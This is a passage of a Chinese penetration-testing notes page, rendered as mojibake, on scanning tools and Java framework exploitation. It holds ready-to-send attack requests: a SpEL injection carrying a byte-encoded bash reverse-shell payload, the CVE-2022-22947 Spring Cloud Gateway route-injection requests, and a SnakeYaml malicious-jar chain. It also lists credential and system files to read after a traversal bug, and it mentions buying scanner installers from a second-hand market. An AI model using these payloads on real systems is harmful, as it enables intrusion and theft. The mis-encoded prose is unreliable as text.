 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    æ›´æ–°æŒ‡çº¹ï¼ˆä¿å­˜ä½ç½®è·ŸOSæœ‰å…³ï¼‰ï¼šobserver_ward -u</span><br><span class="line">    è·Ÿæ–°å·¥å…·æœ¬èº«ï¼šobserver_ward --update-self</span><br><span class="line">    æŒ‡å®šå•ä¸ªæŒ‡çº¹ï¼šobserver_ward -p tomcat.yaml</span><br><span class="line">    æŒ‡å®šæŒ‡çº¹ç›®å½•ï¼šobserver_ward --probe-dir fingers</span><br><span class="line">    æŒ‡å®šç›®æ ‡æ–‡ä»¶ï¼šobserver_ward -l targets.txt</span><br><span class="line">    ç»¼åˆï¼šobserver_ward --proxy socks5://127.0.0.1:7890 --ua &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36&quot; --thread 50 --format csv -o res.csv -t http://www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># æ¼æ´æ‰«æ</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Nuclei</span></span></span><br><span class="line"></span><br><span class="line">1. åŸºæœ¬ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">    ```shell</span><br><span class="line">    [æŒ‡å®šå•ä¸ªæ¨¡æ¿] nuclei -bs 50 -rl 100 --cloud-upload -vv -l targets.txt -t poc.yaml -o output.txt</span><br><span class="line">    [æŒ‡å®šç›®å½•|æŒ‡å®šç¨‹åº¦] nuclei -u http://www.example.com/ -t wordpress/ -s critical</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¼æ´ç›‘æ§+æ¼æ´æ‰«æ+é‚®ç®±å‘Šè­¦</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://gitee.com/shaoxinsec/auto_src</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>é—²é±¼ä¸Šè´­ä¹°å®‰è£…åŒ…ï¼Œæ¯å¹´ä¸€ä¸ªç‰ˆæœ¬</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ¡†æ¶æ¼æ´"><a href="#æ¡†æ¶æ¼æ´" class="headerlink" title="æ¡†æ¶æ¼æ´"></a>æ¡†æ¶æ¼æ´</h3><blockquote>
<p>webå¼€å‘å¯åˆ†ä¸ºæ¡†æ¶å¼€å‘å’Œç³»ç»Ÿå¼€å‘ï¼Œæ¡†æ¶å°±æ˜¯é€ è½®å­ï¼Œé€ å‡ºåŸºæœ¬åŠŸèƒ½å®Œå…¨çš„ä¸€å¥—ç¨‹åºï¼›ç³»ç»Ÿå¼€å‘æ˜¯åœ¨æ¡†æ¶çš„åŸºç¡€ä¹‹ä¸Šï¼ŒåšåŠŸèƒ½çš„ä¸°å¯Œã€ä¿®æ”¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯è°ƒç”¨æ¡†æ¶å·²ç»å†™å¥½çš„åŠŸèƒ½å‡½æ•°ï¼Œè€Œä¸ç”¨è‡ªå·±ä¸€æ­¥ä¸€æ­¥å®ç°ã€‚ä¾‹å¦‚æ¡†æ¶Aä¸­å…³äºæ•°æ®åº“çš„æ“ä½œï¼Œæä¾›äº†å‡½æ•°Bå¯ä»¥ç›´æ¥è·å–æ•°æ®åº“ä¸­æ¯ä¸ªå­—æ®µçš„æ‰€æœ‰å†…å®¹ï¼Œé‚£ä¹ˆåœ¨å¼€å‘ç³»ç»ŸCæ—¶ï¼Œåªéœ€è¦è°ƒç”¨å‡½æ•°Bå°±å¯ä»¥äº†ï¼Œä¸ç”¨è‡ªå·±å†™å®ç°çš„ä»£ç äº†ã€‚åœ¨è¿™é‡Œä¹Ÿå¯ä»¥ä½“ç°å‡ºæ¥ï¼šæ¡†æ¶æ¼æ´çš„å½±å“èŒƒå›´æ˜¯æå¤§çš„ï¼Œå› ä¸ºä½¿ç”¨çš„ç³»ç»Ÿæ•°é‡å¤šã€‚ä¸ç®¡ä½ ä½ çš„webç³»ç»Ÿè‡ªç ”ç¨‹åº¦æœ‰å¤šé«˜ï¼Œåªè¦å¼•å…¥äº†æ¡†æ¶ï¼Œå°±ä¼šå—åˆ°è¯¥æ¡†æ¶æ¼æ´çš„å½±å“ã€‚</p>
<p>å¯¹äºæµ‹è¯•æ¥è¯´ï¼Œæˆ‘ä»¬é¢å¯¹çš„æ˜¯ä¸€å¥—webç³»ç»Ÿï¼Œå¦‚æœè¿™å¥—ç³»ç»Ÿæ˜¯å¼€æºçš„CMSï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½æ‹¿åˆ°æºç è¿›è¡Œå®¡è®¡ï¼Œå¹¶ä¸”äº’è”ç½‘ä¸Šå…³äºè¿™å¥—CMSçš„æ¼æ´è‚¯å®šä¹Ÿæ˜¯æ¯”è¾ƒå¤šçš„ï¼›å³ä½¿è¿™å¥—webç³»ç»Ÿæ˜¯ä¼ä¸šè‡ªç ”çš„ï¼Œé‚£ä¹ˆç™¾åˆ†ç™¾ä¹Ÿä¼šé‡‡ç”¨æ¡†æ¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦æŒæ¡å¸¸è§çš„æ¡†æ¶æ¼æ´ã€‚åœ¨2025å¹´çš„ä»Šå¤©æ¥è¯´ï¼Œjavaä»ç„¶æ˜¯webåç«¯çš„ä¸»æµå¼€å‘è¯­è¨€ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡ç‚¹æŒæ¡javaçš„åç«¯æ¡†æ¶æ¼æ´ã€‚</p>
</blockquote>
<h4 id="JAVA-Struts2"><a href="#JAVA-Struts2" class="headerlink" title="JAVA-Struts2"></a>JAVA-Struts2</h4><ol>
<li><p>struts2æ˜¯apacheæ——ä¸‹çš„ä¸€æ¬¾javaåç«¯æ¡†æ¶ï¼Œæ›¾ç»é£é¡ä¸€æ—¶ï¼ˆStrusts2+Spring+Hibernate&#x3D;SSHï¼‰ï¼Œä½†ç°åœ¨åŸºæœ¬ä¸Šè¢«æ·˜æ±°äº†ï¼Œç°åœ¨çš„javaåç«¯åŸºæœ¬ä¸Šæ˜¯SSMï¼ˆSpringMVC+SpringBoot+Mybatisï¼‰çš„å¤©ä¸‹ã€‚ä¸è¿‡ï¼Œä»ç„¶æœ‰ä¸€äº›è€é¡¹ç›®åœ¨ç”¨Strusts2ï¼Œè€Œä¸”æœ€é‡è¦çš„æ˜¯ç”±äºStruts2è§£æOGNLï¼ˆè¡¨è¾¾å¼è¯­è¨€ï¼Œç²—ç•¥ç†è§£ä¸ºjavaçš„è¯­æ³•ç³–ï¼Œstruts2ä¸­ç»å¸¸è¢«${}æˆ–è€…%{}åŒ…è£¹ï¼Œç”¨æ¥åŒºåˆ†å…¶ä»–ä»£ç ï¼Œä¾‹å¦‚${1*2}è¡¨ç¤º3ã€‚OGNLæ”¯æŒè®¿é—®å…¶ä»–æˆå‘˜ã€å±æ€§ã€è°ƒç”¨æ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥è¢«åˆ©ç”¨ï¼‰çš„ç‰¹ç‚¹ï¼Œå¯¼è‡´ç»å¸¸å‡ºç°RCEæ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨ç ”ç©¶&#x2F;æŒ–æ˜Struts2æ¡†æ¶ï¼Œä½†æ˜¯å¾—æŒæ¡å®ƒçš„åˆ©ç”¨&#x2F;æ¢æµ‹ã€‚</p>
</li>
<li><p>è¯†åˆ«Struts2ï¼ˆç›®å‰æ²¡æœ‰ç²¾å‡†è¯†åˆ«Struts2çš„æ–¹æ³•ï¼‰</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. URLåç¼€ï¼š.actionæˆ–è€….do</span><br><span class="line">2. å°è¯•è®¿é—®é»˜è®¤é…ç½®ç•Œé¢ï¼š/struts/webconsole.html /struts/debug.html</span><br><span class="line">3. å“åº”åŒ…ä¸­ç›´æ¥åŒ…å«strutså…³é”®å­—</span><br><span class="line">4. æŠ¥é”™é¡µé¢ä¸­å«æœ‰strutså…³é”®å­—</span><br><span class="line">5. æŒ‡çº¹è¯†åˆ«å·¥å…·</span><br></pre></td></tr></table></figure>
</li>
<li><p>å…¨ç‰ˆæœ¬æ£€æµ‹å·¥å…·ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p>
</li>
<li><p>æµé‡ç‰¹å¾</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è¯·æ±‚ä¸­æœ‰$&#123;&#125;  $&#123;&#125; ä»¥åŠå¸¸è§çš„rceå‡½æ•°ï¼ˆRuntime.getRuntime().exec()ï¼Œ newå…³é”®å­—ï¼‰ç­‰ç­‰</span><br><span class="line">2. å¤§é‡çš„è¯·æ±‚å‡ºç°.action æˆ–è€… .doåç¼€</span><br><span class="line">3. å“åº”ä¸­å‡ºç°å¸¸è§çš„æ¢æµ‹å‘½ä»¤çš„ç»“æœï¼šifconfig/ etc/passwd /id/whoamiè¿™äº›</span><br><span class="line">4. å“åº”ä¸­å‡ºç°ognl.OgnlExceptionæˆ–è€…java.lang.ProcessBuilderè¿™äº›å…³é”®å­—ï¼ˆæŠ¥é”™ä¿¡æ¯ï¼‰</span><br><span class="line">5. å·¥å…·ç‰¹å¾ï¼šStruts2-scanï¼ˆUAä¸­å«æœ‰Struts2-scançš„å…³é”®å­—ï¼‰ã€å¤©èä¿¡æœ‰å›ºå®šçš„cookieå€¼ã€å®‰æ’çš„å·¥å…·åœ¨UAé‡Œä¹Ÿæœ‰â€˜Auto Spiderâ€™çš„å…³é”®å­—</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ‰¹é‡æœç´¢ï¼šfofaï¼šapp&#x3D;â€struts2â€</p>
</li>
</ol>
<h4 id="JAVA-SpringBoot"><a href="#JAVA-SpringBoot" class="headerlink" title="JAVA-SpringBoot"></a>JAVA-SpringBoot</h4><ol>
<li><p>Springä½œä¸ºjavaåç«¯çš„ä¸€ä¸ªå¤§ç±»æ¡†æ¶ï¼Œåœ°ä½ä¸äºšäºiPhoneåœ¨æ‰‹æœºåœˆä¸­çš„åœ°ä½ï¼Œå…¶ç”Ÿæ€å¤§æ¦‚å¯ä»¥åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼šSpringMVC + SpringSecurity  &#x3D;&#x3D;&gt;  SpringFramework  &#x3D;&#x3D;&gt;  SpringBoot  &#x3D;&#x3D;&gt;  SpringCloudã€‚SpringBootå¯ä»¥ç†è§£ä¸ºSpringFrameworkçš„é­”æ”¹ç‰ˆã€å‡çº§ç‰ˆï¼Œé€šè¿‡æ³¨è§£çš„æ–¹å¼è‡ªåŠ¨é…ç½®é¡¹ç›®ä¾èµ–ç­‰ç›¸å…³é…ç½®ï¼Œçœå»äº†æ‰‹å·¥é…ç½®Springé¡¹ç›®çš„éº»çƒ¦ï¼Œæ‰€ä»¥ä½¿ç”¨èŒƒå›´è¿˜æ˜¯å¾ˆå¹¿çš„ã€‚</p>
</li>
<li><p>è¯†åˆ«SpringBootï¼šé»˜è®¤logoä¸ºå°ç»¿å¶</p>
</li>
<li><p>SpringBootç›®å½•éå†&#x2F;ä»»æ„æ–‡ä»¶è¯»å–</p>
<ul>
<li><p>å…³é”®å‡½æ•°å¯¹ä¼ å…¥çš„filenameåšäº†å‡çš„å®‰å…¨æ£€æŸ¥ï¼ˆæ£€æŸ¥å­˜åœ¨ä¸ï¼Œæ ¹æ ¹ä¸é™åˆ¶ä¼ å…¥çš„æ–‡ä»¶åï¼‰ã€å¯¹ä¼ å…¥çš„baseæ ¹æœ¬æ²¡åšæ£€æŸ¥</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153547126.png" alt="image-20251104153547126"></p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153650613.png" alt="image-20251104153650613"></p>
</li>
<li><p>è¯»å–æ–‡ä»¶</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104154057560.png" alt="image-20251104154057560"></p>
</li>
<li><p>ä»»æ„æ–‡ä»¶è¯»å–  &#x3D;&#x3D;&gt;  Getshell</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0. æ–¹å‘ï¼šæ‰¾è´¦å·å¯†ç ã€ç¨‹åºæºç /äºŒè¿›åˆ¶ï¼ˆé€†å‘æ‰¾keyã€æ‰¾å¯†ç ï¼‰</span><br><span class="line">1. å†å²å‘½ä»¤ï¼ˆå¦‚mysql -uroot -prootï¼‰ï¼š/root/.bash_historyã€/home/username/.bash_history</span><br><span class="line">2. SSHå…¬é’¥ï¼š/root/.ssh/id_rsaã€/root/.ssh/authorized_keys</span><br><span class="line">3. ç³»ç»Ÿä¿¡æ¯ï¼š/etc/redhat-release</span><br><span class="line">4. æœ¬åœ°æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ï¼švar/lib/mlocate/mlocate.db</span><br><span class="line">5. å½“å‰ç”¨æˆ·ï¼š/proc/self/loginuid</span><br><span class="line">6. ç¯å¢ƒå˜é‡ï¼š/proc/self/environ</span><br><span class="line">7. å†…ç½‘ipï¼š/proc/net/fib_trie</span><br><span class="line">8. å½“å‰è¿›ç¨‹å¯¹åº”çš„PIDï¼š/proc/sched_debug</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>actuatoræ˜¯SBä¸­ä¸“é—¨ç”¨æ¥ç›‘æ§javaè¿è¡Œç¯å¢ƒçš„æ¿å—ï¼Œé‡Œé¢çš„å·¥å…·ç±»åŒ…æ‹¬ä½†ä¸é™äºè¯»å–å†…å­˜ä¿¡æ¯ã€ç¯å¢ƒé…ç½®ä¿¡æ¯ã€é‡å¯æ¥å£ç­‰ç­‰ï¼Œè¿™äº›é«˜å±çš„æ¥å£ç»å¸¸å‡ºç°å£æœªæˆæƒè®¿é—®ï¼Œå¯¼è‡´æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œä¸ºè¿›ä¸€æ­¥çš„åˆ©ç”¨æä¾›äº†éå¸¸é‡è¦çš„æƒ…æŠ¥ã€‚ä¸‹é¢æ˜¯actuatorä¸­ä¸€äº›é«˜æ•çš„æ¥å£ï¼Œä»¥åŠè®¿é—®åˆ°è¿™äº›æ¥å£ä¹‹åå¦‚ä½•åˆ©ç”¨æ³„éœ²çš„ä¿¡æ¯ï¼ˆè¿™äº›æ¥å£åœ¨SB1ç‰ˆæœ¬ä¸­ï¼Œæ²¡æœ‰å½’ç±»åˆ°actuatorè·¯å¾„ä¸‹é¢ï¼‰ã€‚</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110145553277.png" alt="image-20251110145553277"></p>
</li>
<li><p>ErrorPageé¡µé¢SpELè¡¨è¾¾å¼æ³¨å…¥(SB1ç‰ˆæœ¬)</p>
<ul>
<li><p>çˆ†ç ´&#x2F;å¯»æ‰¾å¼•å‘ErrorPageçš„æ¥å£ä»¥åŠå‚æ•°ï¼Œä¾‹å¦‚&#x2F;article?id&#x3D;ï¼Œéœ€è¦æ³¨æ„ErrorPageä¸­çš„statusçš„å€¼åº”ä¸º500</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111134757585.png" alt="image-20251111134757585"></p>
</li>
<li><p>æ³¨å…¥SpELè¡¨è¾¾å¼ï¼Œæ‰§è¡ŒRCEåå¼¹shell</p>
  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x32d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br><span class="line"> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>SnakeYaml RCEï¼ˆSpring-Cloud-Btoot-Staterâ‰¤1.3ï¼‰</p>
<ul>
<li><p>åˆ©ç”¨é“¾</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚/envæ¥å£ï¼ˆenvæ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼‰ ==&gt; è®¾ç½®SpringCloudé…ç½®æ–‡ä»¶ä¸ºä¸€ä¸ªæ¶æ„çš„é…ç½®æ–‡ä»¶ ==&gt; è¯¥é…ç½®é…ç½®æ–‡ä»¶æŒ‡å‘ä¸€ä¸ªæ¶æ„çš„jaråŒ… ==&gt; å‘é€è¯·æ±‚ç»™åç«¯ ==&gt; åç«¯æ ¹æ®é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œä¸‹è½½å¹¶è¿è¡ŒjaråŒ…ï¼ˆç›®æ ‡æœºå™¨å¯ä»¥å‡ºç½‘ï¼‰ ==&gt; è¯·æ±‚/refreshæ¥å£ï¼Œåˆ·æ–°æ‰€æœ‰æ¥å£çš„ç¼“å­˜ ==&gt; æˆåŠŸä¸Šçº¿</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®æ–‡ä»¶</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111140514689.png" alt="image-20251111140514689"></p>
</li>
<li><p>exp.jarï¼š<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
</li>
</ul>
</li>
</ol>
<h4 id="JAVA-JDBC"><a href="#JAVA-JDBC" class="headerlink" title="JAVA-JDBC"></a>JAVA-JDBC</h4><ol>
<li>ååºåˆ—åŒ–</li>
</ol>
<h4 id="JAVA-SpringCloudGateway"><a href="#JAVA-SpringCloudGateway" class="headerlink" title="JAVA-SpringCloudGateway"></a>JAVA-SpringCloudGateway</h4><ol>
<li><p>SpringCloudGatewayï¼ˆä»¥ä¸‹ç®€ç§°SCGï¼‰</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. SCGç”¨æ¥è·¯ç”±apiåœ°å€ï¼Œå¤„ç†apiè¯·æ±‚ä»¥åŠå“åº”ï¼ˆBrowser &lt;==&gt; SCG &lt;==&gt; apiï¼‰ï¼Œåœ¨3.1.0åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœapiçš„è¯·æ±‚æˆ–è€…å“åº”ä¸­å­˜åœ¨SpELè¡¨è¾¾å¼ï¼Œé‚£ä¹ˆSCGä»£ç ä¼šè§£æå¹¶ä¸”æ‰§è¡Œè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆäº†ä»£ç æ‰§è¡Œï¼›</span><br><span class="line">2. SBæ·»åŠ SCGä¹‹åï¼Œé€šè¿‡/actuator/gatewayå¯¹SCGè¿›è¡Œæ§åˆ¶ï¼ŒåŠ ä¸Šä¸Šé¢çš„æ¼æ´ï¼Œä»è€Œå®ç°å®Œæ•´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2022-22947ï¼ˆHacker &lt;==&gt; SB-actuator/gateway &lt;==&gt; SCG &lt;==&gt; OSï¼‰</span><br></pre></td></tr></table></figure>
</li>
<li><p>actuatoræ“æ§SCG</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111112050167.png" alt="image-20251111112050167"></p>
</li>
<li><p>å¯é€šè¿‡actuator&#x2F;mappingå°è¯•åˆ¤æ–­SBä¸­æœ‰æ²¡æœ‰å¯ç”¨SCGï¼Œå¹¶å°è¯•SCGæ˜¯å¦æœ‰æƒé™å¯ä»¥è®¿é—®&#x2F;actuator&#x2F;gatewayæ¥å£</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131440359.png" alt="image-20251111131440359"></p>
</li>
<li><p>å‘SCGä¸­æ³¨å†Œä¸€ä¸ªåŒ…å«SpELè¡¨è¾¾å¼çš„è·¯ç”±</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131937318.png" alt="image-20251111131937318"></p>
</li>
<li><p>åˆ·æ–°SCGç¼“å­˜</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131741403.png" alt="image-20251111131741403"></p>
</li>
<li><p>è®¿é—®æ³¨å†Œçš„è·¯ç”±</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131826279.png" alt="image-20251111131826279"></p>
</li>
</ol>
<h4 id="JAVA-Jolokia"><a href="#JAVA-Jolokia" class="headerlink" title="JAVA-Jolokia"></a>JAVA-Jolokia</h4><ol>
<li><p>Jolokia</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Jolokia ==&gt; JVM MBean ==&gt; JVM</span><br><span class="line">1. JVMï¼šæ‰€æœ‰çš„javaä»£ç éƒ½éœ€è¦åœ¨JVMä¸­è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šjavaä»£ç  -&gt; jvm -&gt; æœºå™¨ï¼›</span><br><span class="line">2. JVM MBeanï¼šJMXæ¡†æ¶ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œå¯ä»¥æ§åˆ¶JVMï¼Œå¯¹JVMè¿›è¡Œè¯»å–ã€å†™å…¥ã€æ‰§è¡Œç­‰æ“ä½œï¼›</span><br><span class="line">3. Jolokiaï¼šä¸€ä¸ªç‹¬ç«‹çš„å¼€æºjavaé¡¹ç›®ï¼Œæä¾›apiæ¥å—æ¥è‡ªäºhttpçš„æŒ‡ä»¤ï¼Œå¹¶ç¿»è¯‘æˆæ ‡å‡†çš„JVM MBeanå‘½ä»¤ï¼Œæœ€åä¸¢ç»™JVM MBeanã€‚è¡¥å……ï¼šå¯ä»¥è°ƒç”¨JVM MBeançš„ç»„ä»¶/å·¥å…·æœ‰å¾ˆå¤šï¼ŒJolokiaåªæ˜¯å…¶ä¸­ä¸€ä¸ªã€‚</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¼–å†™JVM MBeanå‘½ä»¤</p>
<ul>
<li><p>å®šä¹‰ 3 ä¸ª MBean æ¥å£</p>
